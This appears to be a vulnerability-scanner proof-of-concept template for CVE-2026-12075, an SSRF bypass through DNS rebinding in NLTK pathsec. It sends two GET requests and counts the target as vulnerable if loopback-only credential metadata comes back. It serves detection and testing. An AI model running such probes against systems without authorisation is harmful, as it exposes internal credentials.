[info]
author = "ave"
description = "CVE-2026-12075 DNS-rebinding SSRF bypass in NLTK pathsec ENFORCE mode"
id = "POC-AVE-2026-0749"
name = "CVE-2026-12075 NLTK pathsec DNS Rebinding SSRF Bypass"
severity = "high"
tags = ["cve-2026-12075"]
vuln_id = [
    "CVE-2026-12075",
    "AVE-2026-0749",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/nltk_download_remote"
protocol = "http"

[poc.requests.body]
content = ""
type = "json"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/nltk_data_load_raw"
protocol = "http"

[poc.requests.body]
content = ""
type = "json"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["TOP-SECRET-LOOPBACK-ONLY-METADATA-CREDENTIALS"]
